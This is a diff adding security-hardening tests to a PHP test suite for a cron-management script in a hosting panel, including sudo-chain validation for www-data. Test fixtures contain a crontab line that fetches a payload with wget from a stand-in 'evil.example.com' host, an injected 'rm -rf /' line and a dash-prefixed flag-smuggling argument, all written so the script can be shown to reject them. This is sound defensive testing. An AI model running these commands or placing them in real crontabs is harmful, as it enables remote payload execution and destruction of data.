@@ -11,6 +11,7 @@
 // Pre-requisites (provisioned by local-dev/entrypoint-setup.sh):
 //   - testuser_ln and testuser2_ln system accounts exist.
 //   - laranode-scripts/bin/laranode-cron.sh is executable.
+//   - /etc/sudoers.d/laranode-cron grants www-data NOPASSWD for the script.
 //   - The process user (root in the container) may run crontab -u <user>.
 
 use App\Models\CronJob;
@@ -60,6 +61,25 @@ function runCronSh(array $args): array
 {
     $script = base_path('laranode-scripts/bin/laranode-cron.sh');
     $cmd = 'bash '.escapeshellarg($script);
+    foreach ($args as $a) {
+        $cmd .= ' '.escapeshellarg($a);
+    }
+
+    $out = [];
+    $code = 0;
+    exec($cmd.' 2>&1', $out, $code);
+
+    return ['exitCode' => $code, 'output' => implode("\n", $out)];
+}
+
+/**
+ * Run laranode-cron.sh via sudo as www-data (validates the production sudo chain).
+ * Returns ['exitCode' => int, 'output' => string].
+ */
+function runCronShViaSudo(array $args): array
+{
+    $script = base_path('laranode-scripts/bin/laranode-cron.sh');
+    $cmd = 'sudo -u www-data sudo -u www-data '.escapeshellarg($script);
     foreach ($args as $a) {
         $cmd .= ' '.escapeshellarg($a);
     }
@@ -199,4 +219,86 @@ test('laranode-cron.sh set rejects a non-_ln target user with non-zero exit', fu
     } finally {
         @unlink($tmpFile);
     }
+})->group('system');
+
+// ---------------------------------------------------------------------------
+// Test 5 (bash hardening): Script rejects argument starting with dash
+// ---------------------------------------------------------------------------
+test('laranode-cron.sh rejects argument starting with dash (flag-smuggling guard)', function () {
+    $result = runCronSh(['-u', 'testuser_ln']);
+
+    expect($result['exitCode'])
+        ->not->toBe(0, 'Script must exit non-zero when first arg starts with dash');
+
+    expect(str_contains($result['output'], "may not start with '-'"))
+        ->toBeTrue('Script must emit flag-smuggling error. Output: '.$result['output']);
+})->group('system');
+
+// ---------------------------------------------------------------------------
+// Test 6 (bash hardening): Script rejects disallowed command in tmp file
+// ---------------------------------------------------------------------------
+test('laranode-cron.sh rejects disallowed command (wget) in tmp file', function () {
+    $oldUmask = umask(0177);
+    $tmpFile = tempnam(sys_get_temp_dir(), 'laranode_cron_disallowed_');
+    umask($oldUmask);
+    // Write a line with wget — not in the php-only allowlist
+    file_put_contents($tmpFile, "* * * * *\twget https://evil.example.com/payload.sh\n");
+
+    try {
+        $result = runCronSh(['set', 'testuser_ln', $tmpFile]);
+
+        expect($result['exitCode'])
+            ->not->toBe(0, 'Script must exit non-zero for disallowed command. Output: '.$result['output']);
+
+        expect(str_contains($result['output'], 'command not allowed'))
+            ->toBeTrue('Script must emit command-not-allowed error. Output: '.$result['output']);
+
+    } finally {
+        @unlink($tmpFile);
+    }
+})->group('system');
+
+// ---------------------------------------------------------------------------
+// Test 7 (bash hardening): Script rejects crontab line with embedded newline injection
+// ---------------------------------------------------------------------------
+test('laranode-cron.sh rejects tmp file line that fails 5-field schedule validation', function () {
+    $oldUmask = umask(0177);
+    $tmpFile = tempnam(sys_get_temp_dir(), 'laranode_cron_inject_');
+    umask($oldUmask);
+    // First line is valid; second line is a bare command without 5-field schedule prefix.
+    // laranode-cron.sh must reject the second line as invalid format.
+    file_put_contents(
+        $tmpFile,
+        "* * * * *\tphp /home/testuser_ln/artisan inspire\nrm -rf /\n"
+    );
+
+    try {
+        $result = runCronSh(['set', 'testuser_ln', $tmpFile]);
+
+        expect($result['exitCode'])
+            ->not->toBe(0, 'Script must exit non-zero for injected bare command. Output: '.$result['output']);
+
+        // Either the format check or the allowlist check fires — both are non-zero.
+        expect(str_contains($result['output'], 'invalid crontab line format') || str_contains($result['output'], 'command not allowed'))
+            ->toBeTrue('Script must emit a validation error. Output: '.$result['output']);
+
+    } finally {
+        @unlink($tmpFile);
+    }
+})->group('system');
+
+// ---------------------------------------------------------------------------
+// Test 8: www-data sudo chain — the production privilege path is exercised
+// ---------------------------------------------------------------------------
+test('www-data can invoke laranode-cron.sh via the sudoers drop-in (sudo chain validation)', function () {
+    // Verify /etc/sudoers.d/laranode-cron is installed.
+    $dropIn = '/etc/sudoers.d/laranode-cron';
+    expect(file_exists($dropIn))
+        ->toBeTrue("$dropIn must exist — install it via entrypoint-setup.sh");
+
+    // Run the script as www-data through the sudo chain to prove NOPASSWD works.
+    $result = runCronShViaSudo(['list', 'testuser_ln']);
+
+    expect($result['exitCode'])
+        ->toBe(0, 'www-data must be able to run laranode-cron.sh via sudo. Output: '.$result['output']);
 })->group('system');
